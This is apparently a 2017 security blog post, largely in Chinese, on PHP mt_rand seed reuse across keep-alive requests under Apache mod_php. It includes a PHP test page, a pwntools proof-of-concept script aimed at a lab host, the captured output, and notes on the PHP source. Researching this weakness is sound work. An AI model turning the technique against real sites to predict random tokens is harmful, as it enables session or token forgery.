---
title: Never believe in automatic seeding
date: '2017-10-06T00:00:00.000Z'
categories: web
tags:
  - php
  - web
---

# Never believe in automatic seeding

国庆佳节，夜夜笙歌，不胜腰力，无心成文。

抛砖引玉，删繁就简，清者自清，明者自明。

## poc.php

```text
<?php
$randcount = 8;
$a = array();
$max = 9999999;
for($i=0;$i<$randcount;$i++){
        $a[$i]=mt_rand(0,$max);
}
var_dump($a);
foreach ($a as $value) {
    echo " ".$value." ".$value." 0 ".$max;
}
echo "\n";
echo "time is ".microtime()."\n";

echo "request token is ".$_GET['token']."\n";
```

## rand\_poc.py

考虑到使用urllib或者requests可能出现同步等问题，所以在写poc的时候直接使用pwntools做了封包和收包，可能不需要考虑这个。

```text
import socket
import random
from pwn import *

port = 80
host = '10.211.55.10'

target = remote(host, port)

def packhttp(token):
    cutoff = "\x0d\x0a"
    payload1 = ''
    payload1 += 'GET /rand.php?token=%s HTTP/1.1'%token + cutoff
    payload1 += 'Host: %s'%host + cutoff
    payload1 += 'Connection: Keep-Alive' + cutoff
    payload1 += cutoff
    return payload1

def randtoken(len=8):
    return ''.join(random.sample(['z','y','x','w','v','u','t','s','r','q','p','o','n','m','l','k','j','i','h','g','f','e','d','c','b','a'], len))

def sar():
    token = randtoken()
    target.send(packhttp(token))
    return target.recvuntil(token)

def poc(target):
    log.info("sending two Keep-Alive http package by one socket connection")
    # payload = payload1 + cutoff*2 +payload1
    # print payload
    recvdata = ''
    recvdata += sar()
    recvdata += sar()

    return recvdata

print poc(target)
```

## poc result

### 16 random number

```text
In [18]: run rand_poc.py
[x] Opening connection to 10.211.55.10 on port 80
[x] Opening connection to 10.211.55.10 on port 80: Trying 10.211.55.10
[+] Opening connection to 10.211.55.10 on port 80: Done
[*] sending two Keep-Alive http package by one socket connection
HTTP/1.1 200 OK
Date: Fri, 06 Oct 2017 09:49:40 GMT
Server: Apache/2.4.18 (Ubuntu)
X-Powered-By: PHP/5.4.34
Vary: Accept-Encoding
Content-Length: 459
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

array(8) {
  [0]=>
  int(5807457)
  [1]=>
  int(5008019)
  [2]=>
  int(8055242)
  [3]=>
  int(6955293)
  [4]=>
  int(326263)
  [5]=>
  int(4832321)
  [6]=>
  int(2186647)
  [7]=>
  int(7073056)
}
 5807457 5807457 0 9999999 5008019 5008019 0 9999999 8055242 8055242 0 9999999 6955293 6955293 0 9999999 326263 326263 0 9999999 4832321 4832321 0 9999999 2186647 2186647 0 9999999 7073056 7073056 0 9999999
time is 0.00477000 1507283380
request token is vnlhqjbt
HTTP/1.1 200 OK
Date: Fri, 06 Oct 2017 09:49:40 GMT
Server: Apache/2.4.18 (Ubuntu)
X-Powered-By: PHP/5.4.34
Vary: Accept-Encoding
Content-Length: 459
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

array(8) {
  [0]=>
  int(6081848)
  [1]=>
  int(5063035)
  [2]=>
  int(1452456)
  [3]=>
  int(3989528)
  [4]=>
  int(944428)
  [5]=>
  int(1400189)
  [6]=>
  int(7948629)
  [7]=>
  int(5599503)
}
 6081848 6081848 0 9999999 5063035 5063035 0 9999999 1452456 1452456 0 9999999 3989528 3989528 0 9999999 944428 944428 0 9999999 1400189 1400189 0 9999999 7948629 7948629 0 9999999 5599503 5599503 0 9999999
time is 0.00676000 1507283380
request token is zgtoyvqw
```

### is there a seed for all ?

## 以下引用自 md5\_salt

## For apache Apache2handler

在`/sapi/apache2handler/sapi_apache2.c`中`static int php_handler(request_rec *r)`函数可以看到，

```text
...
ctx = SG(server_context);
parent_req = ctx->r;
...
if (!parent_req) {
        php_apache_request_dtor(r);
        ...
```

只有在`parent_req`为NULL的情况下，才会运行到`php_apache_request_dtor`，调用`php_request_shutdown`，这个函数会调用注册的`PHP_RSHUTDOWN_FUNCTION`，导致随机数的种子被标记为未初始化。

在Apache下，一个 Connection 中的所有 request 都交给一个 Apache 的进程处理。很可能没有调用到`php_apache_request_dtor`导致在一个 Connection 中的请求共用一个种子。

## for php-fpm

在`/sapi/fpm/fpm/fpm_main.c`中`int main(int argc, char *argv[])`函数可以看到，php-fpm的进程会循环处理请求，请求结束后调用`php_request_shutdown`函数进行清理。因此，在php-fpm的环境下，每个请求用的都是一个新的种子。

